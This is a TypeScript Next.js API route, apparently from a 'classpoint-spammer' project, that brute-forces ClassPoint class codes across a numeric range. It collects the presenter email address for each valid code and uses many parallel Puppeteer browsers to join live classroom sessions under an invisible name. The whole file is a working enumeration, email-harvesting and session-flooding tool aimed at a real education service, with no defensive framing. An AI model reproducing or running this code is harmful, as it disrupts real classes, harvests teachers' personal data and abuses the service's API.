// app/api/spam/route.ts
import { NextResponse } from "next/server";
import axios from "axios";
import {
  VERSION,
  AMOUNT_THREADS,
  START_CODE,
  END_CODE,
  COLLECT_ONLY,
} from "@/src/constants";
import { getDriver } from "@/src/driver";
import { parseArgs } from "@/src/args";
import puppeteer, { Browser, Page } from "puppeteer";

// Define the structure of a valid class code
interface ValidClassCode {
  code: number;
  email: string;
}

export async function POST(request: Request): Promise<NextResponse> {
  const starttime = new Date().toISOString().replace(/[:.]/g, "-");

  // Parse the number of threads from the request body
  const { threads } = await request.json();
  const numThreads: number = parseArgs({ threads: threads.toString() });

  console.clear();
  console.log(`classpoint-spammer v${VERSION}\nSearching...\n`);

  const validClassCodes: ValidClassCode[] = [];

  // Function to search a single code
  const searchCode = async (c: number, browser: Browser): Promise<void> => {
    try {
      const response = await axios.get(
        `https://apitwo.classpoint.app/classcode/region/byclasscode?classcode=${c}`
      );
      const { data, status } = response;

      if (status !== 200) return;
      validClassCodes.push({ code: c, email: data.presenterEmail });

      if (COLLECT_ONLY && !data.presenterEmail.includes(COLLECT_ONLY)) return;

      // Push the valid code to the list so it appears on the main page
      

      const page: Page = await browser.newPage();
      await page.goto(`https://www.classpoint.app/?code=${c}`, {
        waitUntil: "networkidle2",
      });

      // Click the join button using XPath
      const joinButtonHandles = await (page as any).$x(
        '//*[@id="root"]/div/div[1]/div[3]/div/div/div[2]/div[2]/button'
      );
      if (joinButtonHandles.length > 0) {
        await joinButtonHandles[0].click();
      } else {
        console.log(`Error for ${c}: Join button not found.\n`);
        await page.close();
        return;
      }

      // Enter name using XPath
      const nameInputHandles = await (page as any).$x(
        '//*[@id="standard-basic"]'
      );
      if (nameInputHandles.length > 0) {
        await nameInputHandles[0].type("​"); // Invisible character as in original script
      } else {
        console.log(`Error for ${c}: Name input not found.\n`);
        await page.close();
        return;
      }

      // Click the final join button using XPath
      const finalJoinButtonHandles = await (page as any).$x(
        '//*[@id="root"]/div/div[1]/div[3]/div/div/div[4]/button'
      );
      if (finalJoinButtonHandles.length > 0) {
        await finalJoinButtonHandles[0].click();
      } else {
        console.log(`Error for ${c}: Final Join button not found.\n`);
        await page.close();
        return;
      }

      // Check for slideshow using XPath
      const imageElementHandles = await (page as any).$x(
        '//*[@id="root"]/div/div[1]/div[2]/div/div/div[1]/div/div[1]/div/div[1]/div/img'
      );
      if (imageElementHandles.length > 0) {
        const imageUrl: string | null = await page.evaluate(
          (el) => el.getAttribute("src"),
          imageElementHandles[0]
        );
        if (imageUrl) {
          validClassCodes.push({ code: c, email: data.presenterEmail });
          console.log(`Class code found: ${c}`);
        } else {
          console.log(`Error for ${c}: No slideshow found.\n`);
        }
      } else {
        console.log(`Error for ${c}: Not in slideshow.\n`);
      }

      await page.close();
    } catch (error: unknown) {
      const errorMessage =
        error instanceof Error ? error.message : "Unknown error";
      console.log(`Error for ${c}: ${errorMessage}\n`);
    }
  };

  // Function to handle a range of codes
  const searchCodes = async (
    start: number,
    end: number,
    browser: Browser
  ): Promise<void> => {
    for (let code = start; code < end; code++) {
      await searchCode(code, browser);
    }
  };

  // Initialize browsers
  const browsers: Browser[] = await Promise.all(
    Array.from({ length: numThreads }, () => getDriver())
  );

  const threadIncrement = Math.floor((END_CODE - START_CODE) / numThreads);
  const threadsPromises: Promise<void>[] = [];

  for (let i = 0; i < numThreads; i++) {
    const start = START_CODE + i * threadIncrement;
    const end = i === numThreads - 1 ? END_CODE : start + threadIncrement;
    threadsPromises.push(searchCodes(start, end, browsers[i]));
  }

  // Execute all threads
  await Promise.all(threadsPromises);

  // Close all browsers
  await Promise.all(browsers.map((browser) => browser.close()));

  console.log(`Search completed at ${starttime}\n`);

  return NextResponse.json({
    message: "Search completed",
    timestamp: starttime,
    validClassCodes,
  });
}
